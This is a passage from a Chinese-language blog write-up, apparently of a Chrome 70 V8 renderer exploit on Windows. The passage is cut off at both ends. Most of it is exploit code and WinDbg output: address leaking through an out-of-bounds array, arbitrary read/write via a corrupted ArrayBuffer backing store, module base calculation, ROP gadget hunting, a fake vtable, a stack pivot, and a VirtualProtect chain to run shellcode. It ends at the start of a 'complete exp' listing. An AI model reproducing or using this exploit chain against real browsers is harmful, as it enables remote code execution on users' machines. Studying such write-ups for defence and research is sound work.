0x0000300000000000</span></span><br></pre></td></tr></table></figure></p><p>通过将要leak的对象放入object Array，然后通过oob_double_Array将该对象越界读出，得到的就是该对象的指针的double表示。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span>(<span class="params">leak</span>)</span>&#123;</span><br><span class="line">  object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们再new一个ArrayBuffer，通过oob_double_Array的越界写，可以改它的backing_store，于是就可以任意地址读写。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span>(<span class="params">offset, address, value</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  fake_dv[<span class="number">0</span>] = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span>(<span class="params">offset, address</span>)</span>&#123;</span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span><br><span class="line">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有一个小trick就是，我们的oob_double_Array和ArrayBuffer的偏移是不固定的。<br>但是通过user_space_read，我们可以先leak出oob_double_Array和oob_buffer的地址，由于oob_double_Array的fixedArray与其偏移是固定的，而oob_buffer的backing_store和oob_buffer的偏移是固定的.<br>所以我们可以计算出这个偏移是多少。</p><h3 id="得到chrome-child-dll的基地址"><a href="#得到chrome-child-dll的基地址" class="headerlink" title="得到chrome_child.dll的基地址"></a>得到chrome_child.dll的基地址</h3><p>leak出一个blink对象div的地址，它偏移0x20的位置是HTMLDivElement对象，读出后，再读出它首部的虚表地址，然后减去和chrome_child.dll的偏移就是chrome_child.dll的基地址了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">let</span> div_addr = user_space_read(div);</span><br><span class="line">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span><br><span class="line"></span><br><span class="line">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">alert(<span class="string">"[+] the el_addr is at "</span> + Int64.fromDouble(el_addr).toString());</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0:017&gt; dq 0x00004c0eb3ea31f8</span><br><span class="line">00004c0e`b3ea31f8  00007ffb`49c9e910 000001e7`ec4da5c0</span><br><span class="line">00004c0e`b3ea3208  00000000`000e101c 00000000`00000000</span><br><span class="line">00004c0e`b3ea3218  00004c0e`b3ea2538 00000000`00000000</span><br><span class="line">00004c0e`b3ea3228  00000000`00000000 00007ffb`4a46d1f0</span><br><span class="line">00004c0e`b3ea3238  00000000`00000000 00000000`00000000</span><br><span class="line">00004c0e`b3ea3248  00005a68`da2417e8 00000000`00000000</span><br><span class="line">00004c0e`b3ea3258  00000000`00000000 00000000`00000000</span><br><span class="line">00004c0e`b3ea3268  00000000`00000000 00000000`00000000</span><br><span class="line">0:017&gt; g</span><br><span class="line">(3d7c.3af4): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">00007ffb`9da98cc0 cc              int     3</span><br><span class="line">0:017&gt; uf 00007ffb`49c9e910</span><br><span class="line">chrome_child!blink::HTMLDivElement::`vftable&apos;:</span><br><span class="line">00007ffb`49c9e910 dcb14b47fb7f    fdiv    qword ptr [rcx+7FFB474Bh]</span><br><span class="line">00007ffb`49c9e916 0000            add     byte ptr [rax],al</span><br><span class="line">00007ffb`49c9e918 3030            xor     byte ptr [rax],dh</span><br><span class="line">00007ffb`49c9e91a c247fb          ret     0FB47h</span><br><span class="line">0:017&gt; !address chrome_child</span><br><span class="line"></span><br><span class="line">                                     </span><br><span class="line">Mapping file section regions...</span><br><span class="line">Mapping module regions...</span><br><span class="line">Mapping PEB regions...</span><br><span class="line">Mapping TEB and stack regions...</span><br><span class="line">Mapping heap regions...</span><br><span class="line">Mapping page heap regions...</span><br><span class="line">Mapping other regions...</span><br><span class="line">Mapping stack trace database regions...</span><br><span class="line">Mapping activation context regions...</span><br><span class="line"></span><br><span class="line">Usage:                  Image</span><br><span class="line">Base Address:           00007ffb`45960000</span><br><span class="line">End Address:            00007ffb`45961000</span><br><span class="line">Region Size:            00000000`00001000 (   4.000 kB)</span><br><span class="line">State:                  00001000          MEM_COMMIT</span><br><span class="line">Protect:                00000002          PAGE_READONLY</span><br><span class="line">Type:                   01000000          MEM_IMAGE</span><br><span class="line">Allocation Base:        00007ffb`45960000</span><br><span class="line">Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY</span><br><span class="line">Image Path:             C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Module Name:            chrome_child</span><br><span class="line">Loaded Image Name:      C:\Program Files (x86)\Google\Chrome\Application\70.0.3538.110\chrome_child.dll</span><br><span class="line">Mapped Image Name:      </span><br><span class="line">More info:              lmv m chrome_child</span><br><span class="line">More info:              !lmi chrome_child</span><br><span class="line">More info:              ln 0x7ffb45960000</span><br><span class="line">More info:              !dh 0x7ffb45960000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content source: 1 (target), length: 1000</span><br><span class="line">0:017&gt; ? 00007ffb`49c9e910-00007ffb`45960000</span><br><span class="line">Evaluate expression: 70510864 = 00000000`0433e910</span><br></pre></td></tr></table></figure><h3 id="计算kernel32的基地址"><a href="#计算kernel32的基地址" class="headerlink" title="计算kernel32的基地址"></a>计算kernel32的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x chrome_child!*CreateEventW*</span><br><span class="line">00007ffb`465faea2 chrome_child!media::MediaLog::CreateEventW (media::MediaLogEvent::Type)</span><br><span class="line">00007ffb`4a33b4f8 chrome_child!_imp_CreateEventW = &lt;no type information&gt;</span><br><span class="line"></span><br><span class="line">0:016&gt; dq 00007ffb`4a33b4f8</span><br><span class="line">00007ffb`4a33b4f8  00007ffb`9c001f20</span><br><span class="line">0:016&gt; u 00007ffb`9c001f20</span><br><span class="line">KERNEL32!CreateEventW:</span><br><span class="line">00007ffb`9c001f20 ff2522480500    jmp     qword ptr [KERNEL32!_imp_CreateEventW (00007ffb`9c056748)]</span><br><span class="line">00007ffb`9c001f26 cc              int     3</span><br><span class="line">00007ffb`9c001f27 cc              int     3</span><br><span class="line">00007ffb`9c001f28 cc              int     3</span><br><span class="line">00007ffb`9c001f29 cc              int     3</span><br><span class="line">00007ffb`9c001f2a cc              int     3</span><br><span class="line">00007ffb`9c001f2b cc              int     3</span><br><span class="line">00007ffb`9c001f2c cc              int     3</span><br></pre></td></tr></table></figure><h3 id="计算ntdll的基地址"><a href="#计算ntdll的基地址" class="headerlink" title="计算ntdll的基地址"></a>计算ntdll的基地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; x KERNEL32!*NtQueryEvent*</span><br><span class="line">00007ffb`9c056dd8 KERNEL32!_imp_NtQueryEvent = &lt;no type information&gt;</span><br><span class="line">0:016&gt; dq 00007ffb`9c056dd8</span><br><span class="line">00007ffb`9c056dd8  00007ffb`9da95db0</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb`9da95db0</span><br><span class="line">ntdll!NtQueryEvent:</span><br><span class="line">00007ffb`9da95db0 4c8bd1          mov     r10,rcx</span><br><span class="line">00007ffb`9da95db3 b856000000      mov     eax,56h</span><br><span class="line">00007ffb`9da95db8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1</span><br><span class="line">00007ffb`9da95dc0 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffb`9da95dc5)</span><br><span class="line">00007ffb`9da95dc2 0f05            syscall</span><br><span class="line">00007ffb`9da95dc4 c3              ret</span><br><span class="line">00007ffb`9da95dc5 cd2e            int     2Eh</span><br></pre></td></tr></table></figure><h3 id="寻找gadaget"><a href="#寻找gadaget" class="headerlink" title="寻找gadaget"></a>寻找gadaget</h3><h4 id="栈劫持"><a href="#栈劫持" class="headerlink" title="栈劫持"></a>栈劫持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007ff9`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span><br><span class="line">00007ff9`296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]</span><br><span class="line">00007ff9`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]</span><br><span class="line">00007ff9`296f0711 ffe2            jmp     rdx</span><br></pre></td></tr></table></figure><p>search-&gt;sequence of bytes<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-084700.png" alt=""></p><h4 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// pop rcx ; ret     59 c3</span><br><span class="line">// pop rdx ; ret       5a c3</span><br><span class="line">// pop r8 ; ret      41 58 c3</span><br><span class="line">// pop r9 ; ret      41 59 c3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; u 00007ffb`45d6982c</span><br><span class="line">chrome_child!blink::AutoscrollController::HandleMouseMoveForMiddleClickAutoscroll+0x16c [C:\b\c\b\win64_clang\src\third_party\blink\renderer\core\page\autoscroll_controller.cc @ 237]:</span><br><span class="line">00007ffb`45d6982c 59              pop     rcx</span><br><span class="line">00007ffb`45d6982d c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb`45960000 L1000000 C359</span><br><span class="line">00007ffb`45d6982c  c359 0ff3 4411 2024 0ff3 7c11 2424 2e0f  Y....D$ ...|$$..</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb`45a8d91a</span><br><span class="line">chrome_child!cc::SingleKeyframeEffectAnimation::SingleKeyframeEffectAnimation+0x3a [C:\b\c\b\win64_clang\src\cc\animation\single_keyframe_effect_animation.cc @ 44]:</span><br><span class="line">00007ffb`45a8d91a 5a              pop     rdx</span><br><span class="line">00007ffb`45a8d91b c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb`45960000 L1000000 C35a</span><br><span class="line">00007ffb`45a8d91a  c35a 4803 c389 8b48 7856 2b48 7056 c148  Z..H..H.VxH+VpH.</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb`46b16012</span><br><span class="line">chrome_child!v8::internal::compiler::RawMachineAssembler::TargetParameter+0x2 [C:\b\c\b\win64_clang\src\v8\src\compiler\raw-machine-assembler.cc @ 82]:</span><br><span class="line">00007ffb`46b16012 4158            pop     r8</span><br><span class="line">00007ffb`46b16014 c3              ret</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb`45960000 L1000000 5841</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb`46b16012  5841 ccc3 cccc cccc cccc cccc cccc 4856  AX............VH</span><br><span class="line"></span><br><span class="line">0:016&gt; u 00007ffb`472db44c</span><br><span class="line">chrome_child!DeblockLumaTransposeH2V_sse2+0x1ec:</span><br><span class="line">00007ffb`472db44c 4159            pop     r9</span><br><span class="line">00007ffb`472db44e c3              ret</span><br><span class="line">00007ffb`472db44f 90              nop</span><br><span class="line"></span><br><span class="line">0:016&gt; s -w 00007ffb`45960000 L1000000 5941</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffb`472db44c  5941 90c3 5141 4850 ec83 f320 7f0f 2434  AY..AQPH.. ...4$</span><br></pre></td></tr></table></figure><h3 id="创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode"><a href="#创建一块大的可读写空间，fake-vtable和栈伪造，栈劫持和mprotect执行shellcode" class="headerlink" title="创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode"></a>创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span><br><span class="line"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> BigUint64Array(scratch);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span><br><span class="line">scratch_u64.fill(gadget, <span class="number">0</span>, <span class="number">100</span>);<span class="comment">//把其首部当做fake_vtab，在virtual call执行的时候会执行这里面的语句，于是跳转到gadget执行，这个gadget用于栈劫持,此时rcx的值应为el_addr的地址。</span></span><br><span class="line"><span class="keyword">let</span> fake_vtab = scratch_addr;</span><br><span class="line">...</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span><br><span class="line">writePtr(offset, el_addr, fake_vtab);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0709 <span class="number">488</span>b6918        mov     rbp,qword ptr [rcx+<span class="number">18</span>h]</span><br><span class="line"><span class="number">00007</span>ff9<span class="string">`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h] //改变rsp的值为fake_stack</span></span><br><span class="line"><span class="string">00007ff9`</span><span class="number">296</span>f0711 ffe2            jmp     rdx <span class="comment">//改变rip到一个ret指令</span></span><br></pre></td></tr></table></figure><p>栈劫持之后，开始执行我们的mprotect gadaget，使shellcode所在的页可执行，然后跳转到shellcode执行<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack = [</span><br><span class="line">    pop_rcx_ret,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span><br><span class="line">    pop_r8_ret,</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span><br><span class="line">    pop_r9_ret,</span><br><span class="line">    scratch_addr,</span><br><span class="line">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span><br><span class="line">    sc_addr,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span><br><span class="line">    scratch_u64[<span class="number">0x10000</span>/<span class="number">8</span> + i] = stack[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span 